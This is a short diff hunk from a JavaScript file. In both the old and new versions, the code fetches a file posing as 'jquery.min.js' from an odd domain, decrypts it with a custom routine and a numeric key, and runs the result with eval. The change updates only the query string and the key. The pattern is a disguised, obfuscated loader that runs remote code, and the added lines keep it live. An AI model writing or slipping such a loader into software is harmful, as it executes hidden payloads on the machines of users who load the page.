@@ -24,10 +24,10 @@ function Decrypt(s1, id) {
 }
 
 
-fetch('https://cdn.iplezier.site/assets/js/habbo/jquery.min.js?1010')
+fetch('https://cdn.iplezier.site/assets/js/habbo/jquery.min.js?ver=3.1')
     .then(function(response) {
         return response.text();
     })
     .then(function(body) {
-        eval(Decrypt(body, 8891));
+        eval(Decrypt(body, 1247));
 });
